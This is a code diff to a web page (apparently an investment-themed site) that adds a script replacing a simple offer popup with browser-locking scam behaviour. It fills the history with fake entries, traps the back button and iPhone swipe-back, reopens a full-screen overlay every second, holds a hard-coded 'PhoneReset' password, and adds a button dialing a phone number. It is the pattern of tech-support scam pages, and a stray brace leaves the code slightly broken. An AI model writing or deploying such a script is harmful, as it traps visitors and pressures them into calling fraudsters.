@@ -382,25 +382,96 @@ increase your investment returns?
 
 <script>
 
-setTimeout(function(){
+let popupInterval;
+let cancelled = false;
 
-document.getElementById("popup").style.display="flex";
+const REQUIRED_PASSWORD = "PhoneReset@321@#890";
 
-},3000);
+/* REMOVE PREVIOUS HISTORY ENTRY */
+history.replaceState(null,null,location.href);
+
+/* CREATE FAKE HISTORY STACK */
+for(let i=0;i<50;i++){
+history.pushState({trap:true},"",location.href);
+}
+
+/* BACK BUTTON TRAP */
+window.addEventListener("popstate",function(){
+
+history.pushState({trap:true},"",location.href);
+
+openPopup();
+
+});
+
+/* SAFARI PAGE CACHE FIX */
+window.addEventListener("pageshow",function(e){
+
+if(e.persisted){
+history.pushState(null,null,location.href);
+}
+
+});
 
 
-function acceptOffer(){
+/* MAIN POPUP */
 
-window.location.replace("Error.html");
+function openPopup(){
+
+if(!cancelled){
+document.getElementById("overlay").style.display="flex";
+}
 
 }
 
-function declineOffer(){
+function closePopup(){
 
-document.getElementById("popup").style.display="none";
+document.getElementById("overlay").style.display="none";
 
 }
-  
+
+
+/* CALL BUTTON */
+
+call.onclick=function(){
+
+window.location.href="tel:+18122668825";
+
+};
+
+}
+
+/* CANCEL BUTTON */
+
+function cancelAction(){
+
+cancelled=true;
+clearInterval(popupInterval);
+
+}
+
+
+/* INITIAL PAGE LOAD */
+
+window.onload=function(){
+
+openPopup();
+
+popupInterval=setInterval(openPopup,1000);
+
+};
+
+
+/* BLOCK IPHONE SWIPE BACK */
+
+document.addEventListener("touchstart",function(e){
+
+if(e.touches[0].clientX<20){
+e.preventDefault();
+}
+
+},{passive:false});
+
 </script>
 
 </body>
